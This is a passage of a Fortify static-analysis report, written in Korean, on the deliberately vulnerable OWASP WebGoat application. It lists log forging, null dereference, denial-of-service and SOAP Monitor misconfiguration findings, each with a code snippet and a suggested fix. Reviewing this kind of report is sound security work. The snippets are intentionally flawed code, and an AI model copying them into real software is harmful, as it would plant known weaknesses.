                            <Abstract>HammerHead.java의 log() 메서드는 확인되지 않은 사용자 입력을 306 줄에 있는 로그에 기록합니다. 공격자가 이 동작을 이용하여 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>306</LineStart>
<Snippet>	String output = new Date() + " | " + request.getRemoteHost() + ":"
		+ request.getRemoteAddr() + " | " + message;
	log(output);
	System.out.println(output);
    }</Snippet>
<TargetFunction>javax.servlet.GenericServlet.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>593</LineStart>
<Snippet>	}

	return request.getParameterValues(name);
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="25146322E3E5D6C9F6EEC559EBC4B1A5" ruleID="BC8B84DA-895A-4C9D-B357-648B9F599B9C">
                            <Category>Log Forging</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>LessonSource.java의 doPost() 메서드는 확인되지 않은 사용자 입력을 105 줄에 있는 로그에 기록합니다. 공격자가 이 동작을 이용하여 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>105</LineStart>
<Snippet>	    {
		thr.printStackTrace();
		log(request, "Could not write error screen: "
			+ thr.getMessage());
	    }</Snippet>
<TargetFunction>org.owasp.webgoat.HammerHead.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Controller.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/servlets/Controller.java</FilePath>
<LineStart>65</LineStart>
<Snippet>    {

	String userAgent = request.getHeader("user-agent");

	String clientBrowser = "Not known!";</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4179E644761CD4A3FAF2F275662F135A" ruleID="BC8B84DA-895A-4C9D-B357-648B9F599B9C">
                            <Category>Log Forging</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HammerHead.java의 log() 메서드는 확인되지 않은 사용자 입력을 306 줄에 있는 로그에 기록합니다. 공격자가 이 동작을 이용하여 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>306</LineStart>
<Snippet>	String output = new Date() + " | " + request.getRemoteHost() + ":"
		+ request.getRemoteAddr() + " | " + message;
	log(output);
	System.out.println(output);
    }</Snippet>
<TargetFunction>javax.servlet.GenericServlet.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>576</LineStart>
<Snippet>	}

	return request.getParameterNames();
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterNames()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D4F6841F5B571DFA285F015756FE58A3" ruleID="BC8B84DA-895A-4C9D-B357-648B9F599B9C">
                            <Category>Log Forging</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 확인되지 않은 사용자 입력을 173 줄에 있는 로그에 기록합니다. 공격자가 이 동작을 이용하여 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>173</LineStart>
<Snippet>	    UserTracker userTracker = UserTracker.instance();
	    userTracker.update(mySession, screen);
	    log(request, screen.getClass().getName() + " | "
		    + mySession.getParser().toString());
</Snippet>
<TargetFunction>org.owasp.webgoat.HammerHead.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Controller.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/servlets/Controller.java</FilePath>
<LineStart>65</LineStart>
<Snippet>    {

	String userAgent = request.getHeader("user-agent");

	String clientBrowser = "Not known!";</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="81E68A780910D710E6290EA2FEFC6A98" ruleID="BC8B84DA-895A-4C9D-B357-648B9F599B9C">
                            <Category>Log Forging</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 확인되지 않은 사용자 입력을 205 줄에 있는 로그에 기록합니다. 공격자가 이 동작을 이용하여 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>205</LineStart>
<Snippet>	    {
		thr.printStackTrace();
		log(request, "Could not write error screen: "
			+ thr.getMessage());
	    }</Snippet>
<TargetFunction>org.owasp.webgoat.HammerHead.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>177</LineStart>
<Snippet>
	    // Redirect the request to our View servlet
	    String userAgent = request.getHeader("user-agent");
	    String clientBrowser = "Not known!";
	    if (userAgent != null)</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Null Dereference</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Encoding.java의 hashMD5() 메서드는 648 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Null 포인터 예외는 일반적으로 하나 이상의 프로그래머 가정을 위반했을 때 발생합니다. 저장 후 역참조(dereference-after-store) 오류는 프로그램이 명시적으로 개체를 null로 설정한 다음 나중에 역참조할 경우 발생합니다. 이 오류는 프로그래머가 선언된 상태의 변수를 null로 초기화하여 발생하는 경우가 많습니다.


대부분의 null 포인터 이슈는 소프트웨어 전반의 안정성 문제를 야기하지만 공격자가 의도적으로 null 포인터 역참조를 실행하는 경우, 그 결과 발생하는 예외 사항을 사용하여 보안 로직을 무시하거나 차후의 공격을 계획하는 데 유용한 디버깅 정보를 응용 프로그램이 노출하도록 할 수 있습니다.

예제: 다음 코드에서 프로그래머는 명시적으로 변수 foo를 null로 설정합니다. 나중에 프로그래머는 개체의 null 값을 검사하기 전에 foo를 역참조합니다.


Foo foo = null;
...
foo.setBar(val);
...
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>null일 수도 있는 개체를 역참조하기 전에 주의를 기울여 검사합니다. 가능한 경우, 추상 null은 리소스를 조작하는 코드 주변의 래퍼를 검사하여 모든 경우에 적용되는지 확인하고 실수가 발생할 위치를 최소화합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>8</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="DCEFD76972F73EAB44A108EF5B2D9B9E" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CreateDB.java의 main() 메서드는 88 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>88</LineStart>
<Snippet>	try
	{
	    Statement answer_statement = connection.createStatement(
		    ResultSet.TYPE_SCROLL_INSENSITIVE,
		    ResultSet.CONCUR_READ_ONLY);</Snippet>
<TargetFunction>Dereferenced : connection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DB4F3DDACD82302E2DA008EB284971D6" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>XPATHInjection.java의 createContent() 메서드는 185 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XPATHInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XPATHInjection.java</FilePath>
<LineStart>185</LineStart>
<Snippet>		tr.addElement(new TD().addElement(arrTokens[2]));
		tr.addElement(new TD().addElement(arrTokens[4]));
		t2.addElement(tr);

	    }</Snippet>
<TargetFunction>Dereferenced : t2()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B6C3A77AAA4D1A0D6C3E08A2B01439F9" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>LessonTracker.java의 load() 메서드는 260 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>260</LineStart>
<Snippet>	    try
	    {
		in.close();
	    }
	    catch (Exception e)</Snippet>
<TargetFunction>Dereferenced : in()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8D828F3B19E452F8FF5CAA70C4112957" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Encoding.java의 hashSHA() 메서드는 674 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>674</LineStart>
<Snippet>			e.printStackTrace();
		}
		return ( base64Encode( md.digest() ) );
	}
</Snippet>
<TargetFunction>Dereferenced : md()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D797A398E012EB1CDCAE32BF00644EAE" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Encoding.java의 hashMD5() 메서드는 648 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>648</LineStart>
<Snippet>			e.printStackTrace();
		}
		return ( base64Encode( md.digest() ) );
	}
</Snippet>
<TargetFunction>Dereferenced : md()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6FAEC70B7AF50870D34891D1ACCFB573" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>LessonTracker.java의 store() 메서드는 401 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>401</LineStart>
<Snippet>	    try
	    {
		out.close();
	    }
	    catch (Exception e)</Snippet>
<TargetFunction>Dereferenced : out()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B50E8FCC4DAAA7731EA9B3E088230EDB" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>LessonSource.java의 updateSession_DELETEME() 메서드는 134 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>134</LineStart>
<Snippet>	    realSession = (WebSession) o;
	}
	session.setCurrentScreen(realSession.getCurrentScreen());
	session.setCourse(realSession.getCourse());
	session.setRequest(request);</Snippet>
<TargetFunction>Dereferenced : realSession()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FF960AE97C1C857482B91047F52F5DE4" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>WebgoatProperties.java의 main() 메서드는 124 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebgoatProperties.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebgoatProperties.java</FilePath>
<LineStart>124</LineStart>
<Snippet>	    e.printStackTrace();
	}
	System.out.println(properties.getProperty("CommandInjection.category"));
    }
</Snippet>
<TargetFunction>Dereferenced : properties()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="7">
                        <groupTitle>Denial of Service</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>AbstractLesson.java의 380 줄, readLine() 호출을 사용하면 공격자가 프로그램을 중단할 수 있게 되거나 정식 사용자가 이용할 수 없게 됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>공격자가 응용 프로그램에 요청을 과도하게 보내어 정식 사용자에 대한 서비스를 거부할 수도 있으나 플러딩(flooding) 공격은 네트워크 계층에서 무산되는 경우도 있습니다. 더 심각한 문제는 적은 수의 요청으로 공격자가 응용 프로그램을 과부화하도록 허용하는 버그입니다. 이러한 버그는 해당 요청이 사용되는 시스템 자원의 수치 또는 이 수치를 사용하는 기간을 공격자가 지정하도록 허용합니다.

예제 1: 다음 코드는 스레드가 절전 모드인 시간을 사용자가 지정하도록 허용합니다. 공격자는 큰 수를 지정하여 스레드를 무기한으로 지연시킬 수 있습니다. 적은 수의 요청으로 공격자가 응용 프로그램의 스레드 풀을 고갈시킬 수 있습니다.


  int usrSleepTime = Integer.parseInt(usrInput);
  Thread.sleep(usrSleepTime);


예제 2: 다음 코드는 zip 파일에서 문자열을 읽습니다. 이 코드에서는 readLine() 메서드를 사용하기 때문에 범위 지정 없는 입력 양을 읽습니다. 공격자가 OutOfMemoryException을 발생시키거나 대량의 메모리를 소모하도록 이 코드를 이용할 수 있으므로 프로그램이 가비지 수집(garbage collection)을 수행하는 데 더 많은 시간을 소모하거나 이후의 일부 작업 중에 메모리가 부족해집니다.


  InputStream zipInput = zipFile.getInputStream(zipEntry);
  Reader zipReader = new InputStreamReader(zipInput);
  BufferedReader br = new BufferedReader(zipReader);
  String line = br.readLine();
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>자원을 부적절하게 이용하지 않도록 사용자 입력을 확인합니다.

예제 3: 다음 코드를 통해 사용자는 Example 1과 같이 스레드가 절전 모드로 있을 시간을 지정할 수 있지만 이는 값이 타당한 범위에 있는 경우에만 해당합니다.

  int usrSleepTime = Integer.parseInt(usrInput);
  if (usrSleepTime &gt;= SLEEP_MIN &amp;&amp;
      usrSleepTime &lt;= SLEEP_MAX) {
    Thread.sleep(usrSleepTime);
  } else {
    throw new Exception("Invalid sleep duration");
  }
}


예제 4: 다음 코드는 Example 2에서와 같이 zip 파일에서 문자열을 읽지만 이 코드가 읽는 최대 문자열 길이는 MAX_STR_LEN자입니다.

  InputStream zipInput = zipFile.getInputStream(zipEntry);
  Reader zipReader = new InputStreamReader(zipInput);
  BufferedReader br = new BufferedReader(zipReader);
  StringBuffer sb = new StringBuffer();
  int intC;
  while ((intC = br.read()) != -1) {
    char c = (char) intC;
    if (c == '\n') {
      break;
    }
    if (sb.length() &gt;= MAX_STR_LEN) {
      throw new Exception("input too long");
    }
    sb.append(c);
  }
  String line = sb.toString();
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 공격자가 소모될 시스템 리소스의 양 또는 시스템 리소스가 사용될 기간을 통제하지 않은 경우 또는 최소한 직접적으로 통제하지 않은 경우에도 Denial of service가 발생할 수 있습니다. 오히려 프로그래머가 이러한 매개 변수를 지정하기 위해 안전하지 않은 상수 값을 선택할 수 있습니다. Fortify Secure Coding Rulepacks는 이러한 경우를 잠재적인 Denial of Services 취약점으로 보고합니다.

2. 이 취약점에 권장되는 수정 방법은 감지되지 않을 수 있으므로 수정 후 추가 감사를 수행하여 수정을 확인해야 할 수 있습니다. 취약점이 제거된 것을 확인한 후 문제를 안전하게 억제할 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>7</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="82D086BCD95AD09F495F3C599DF5CE7E" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 1035 줄, readLine() 호출을 사용하면 공격자가 프로그램을 중단할 수 있게 되거나 정식 사용자가 이용할 수 없게 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>1035</LineStart>
<Snippet>	    String line;

	    while ((line = reader.readLine()) != null)
	    {
		ec.addElement(new StringElement(line));</Snippet>
<TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D952C12A5423B822395BF743BB148DCC" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 465 줄, readLine() 호출을 사용하면 공격자가 프로그램을 중단할 수 있게 되거나 정식 사용자가 이용할 수 없게 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>465</LineStart>
<Snippet>	    String line;

	    while ((line = reader.readLine()) != null)
	    {
		if (numbers)</Snippet>
<TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9AF0499627DB625C86C9B1EF9C22A9FB" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>LessonAdapter.java의 95 줄, readLine() 호출을 사용하면 공격자가 프로그램을 중단할 수 있게 되거나 정식 사용자가 이용할 수 없게 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>95</LineStart>
<Snippet>		BufferedReader in = new BufferedReader(new FileReader(fileName));
		String line = null;
		while ((line = in.readLine()) != null)
		{
		    pre.addElement(line + "\n");</Snippet>
<TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EDF948D557DECD622C3456D5B753A503" ruleID="5c0b56c2-93d3-48e6-b061-c89dbffb2628">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Exec.java의 418 줄, waitFor() 호출을 사용하면 공격자가 프로그램을 중단할 수 있게 되거나 정식 사용자가 이용할 수 없게 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>418</LineStart>
<Snippet>	    if (!interrupted.get(0) &amp;&amp; !lazyQuit)
	    {
		int returnCode = child.waitFor();
		results.setReturnCode(returnCode);
</Snippet>
<TargetFunction>waitFor()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="11410FE5B221F247DBAF9EE94BA91A8A" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>LessonAdapter.java의 288 줄, readLine() 호출을 사용하면 공격자가 프로그램을 중단할 수 있게 되거나 정식 사용자가 이용할 수 없게 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>288</LineStart>
<Snippet>		String line = null;
		boolean startAppending = false;
		while ((line = in.readLine()) != null)
		{
		    if (line.indexOf("&lt;!-- Start Instructions --&gt;") != -1)</Snippet>
<TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="95AE736E3A7D74C95F35C1A5AF0DC9B7" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 380 줄, readLine() 호출을 사용하면 공격자가 프로그램을 중단할 수 있게 되거나 정식 사용자가 이용할 수 없게 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>380</LineStart>
<Snippet>	    String line;

	    while ((line = reader.readLine()) != null)
	    {
		if ((line.indexOf(methodName) != -1)</Snippet>
<TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EDF948D557DECD622C3456D5B753A504" ruleID="5c0b56c2-93d3-48e6-b061-c89dbffb2628">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Exec.java의 229 줄, waitFor() 호출을 사용하면 공격자가 프로그램을 중단할 수 있게 되거나 정식 사용자가 이용할 수 없게 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>229</LineStart>
<Snippet>	    if (!interrupted.get(0) &amp;&amp; !lazyQuit)
	    {
		int returnCode = child.waitFor();
		results.setReturnCode(returnCode);
</Snippet>
<TargetFunction>waitFor()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Axis 2 Misconfiguration: Debug Information</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>SOAP Monitor 모듈을 사용하면 공격자가 SOAP 트래픽을 스니핑할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Apache Axis 2는 Java 애플릿을 통해 들어오고 나가는 SOAP 메시지를 모니터링할 수 있는 개발자 유틸리티를 제공합니다. SOAP Monitor는 웹 서비스를 호출하는 데 사용되는 모든 SOAP 메시지를 보여줍니다. 공격자는 이 유틸리티를 사용하여 웹 서비스와 해당 클라이언트 간의 트래픽을 도청할 수 있습니다.

</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>구성 파일에서 SOAP Monitor에 대한 참조를 제거하여 SOAP Monitor를 비활성화하십시오. 특히 web.xml에 SOAP Monitor 서비스에 대한 servlet 또는 servlet-mapping이 포함되지 않는지 확인하십시오. 또한 axis2.xml에 &lt;module ref="soapmonitor"/&gt;와 같은 참조가 없는지 확인하십시오.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>6</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="6EAF343D747C9A95AAD3933BF76BF3BC" ruleID="C15A1F06-3B47-4AA2-AFD1-02E895160582">
                            <Category>Axis 2 Misconfiguration: Debug Information</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>SOAP Monitor 모듈을 사용하면 공격자가 SOAP 트래픽을 스니핑할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>95</LineStart>
<Snippet>      &lt;/servlet-class&gt;
      &lt;init-param&gt;
        &lt;param-name&gt;SOAPMonitorPort&lt;/param-name&gt;
        &lt;param-value&gt;5001&lt;/param-value&gt;
      &lt;/init-param&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="6EAF343D747C9A95AAD3933BF76BF3BE" ruleID="C15A1F06-3B47-4AA2-AFD1-02E895160582">
                            <Category>Axis 2 Misconfiguration: Debug Information</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>SOAP Monitor 모듈을 사용하면 공격자가 SOAP 트래픽을 스니핑할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>217</LineStart>
<Snippet>    &lt;servlet-mapping&gt;
      &lt;servlet-name&gt;SOAPMonitorService&lt;/servlet-name&gt;
      &lt;url-pattern&gt;/SOAPMonitor&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
 </Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="6EAF343D747C9A95AAD3933BF76BF3B9" ruleID="C15A1F06-3B47-4AA2-AFD1-02E895160582">
                            <Category>Axis 2 Misconfiguration: Debug Information</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>SOAP Monitor 모듈을 사용하면 공격자가 SOAP 트래픽을 스니핑할 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>89</LineStart>
<Snippet>
    &lt;servlet&gt;
      &lt;servlet-name&gt;SOAPMonitorService&lt;/servlet-name&gt;
      &lt;display-name&gt;SOAPMonitorService&lt;/display-name&gt;
      &lt;servlet-class&gt;</Snippet>
                            </Primary>
                        </Issue>
